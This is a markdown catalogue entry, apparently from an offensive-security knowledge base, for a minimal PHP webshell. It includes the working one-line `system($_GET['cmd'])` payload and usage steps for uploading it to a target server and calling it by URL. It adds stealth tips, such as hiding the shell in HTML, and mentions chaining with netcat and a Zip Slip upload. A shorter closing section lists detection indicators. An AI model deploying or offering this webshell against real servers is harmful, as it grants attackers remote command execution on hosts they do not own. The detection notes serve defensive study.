---
type: code
language: php
verified: true
tags:
  - webshell
  - php
  - rce
  - payload
platforms:
  - Linux
  - Unix
  - Web
validated: true
---

# simple-php-webshell

## Code

```php
<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>
```

## Description

This PHP code implements a minimal webshell that executes operating system commands passed via the 'cmd' GET parameter using the system() function. It provides a simple interface for remote command execution (RCE) on PHP-enabled web servers, commonly used in post-exploitation scenarios after file upload vulnerabilities like Zip Slip.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET["cmd"] | Command to execute (passed via URL query) | id, whoami, ls -la |

(No hardcoded variables; relies on HTTP GET input.)

## Usage

Save the code to a .php file (e.g., shell.php) and upload/deploy it to a web-accessible directory on the target Unix server. Access via browser or curl: http://target.com/shell.php?cmd=uname -a. The server will execute the command and return output directly in the response body. For stealth, wrap in HTML or add authentication checks. This payload is delivered via exploits like the Zip Slip procedure and can be chained with tools like netcat for interactive shells.

## Detection

- PHP access logs showing unusual GET parameters like ?cmd= (enable mod_logio in Apache for query logging).
- Filesystem scans for .php files containing system(), exec(), or passthru() functions (use tools like Lynis or custom grep).
- Runtime monitoring: Process trees where httpd/apache spawns /bin/sh or child processes from web requests.
- WAF rules matching command patterns (e.g., ; | && in queries) or anomalous HTTP responses with shell output.

## Related

- [[procedures/Zip-Slip-Exploit-for-PHP-Shell-Upload-on-Unix-Server]]
- [[commands/create-simple-php-webshell]]
